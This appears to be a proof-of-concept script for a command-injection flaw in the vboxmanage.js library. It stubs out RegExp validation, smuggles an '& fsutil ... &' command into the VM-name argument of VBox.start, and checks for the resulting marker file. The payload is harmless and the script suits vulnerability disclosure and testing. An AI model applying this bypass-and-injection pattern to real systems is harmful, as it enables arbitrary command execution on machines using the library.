RegExp.prototype.test = () => true;
const VBox = require('vboxmanage.js');
const fs = require('fs');
const path = './vboxmanag-js';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(VBox.start('"& fsutil file createnew vboxmanag-js 0 &"').then(function () {
}).catch(() => {
}).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));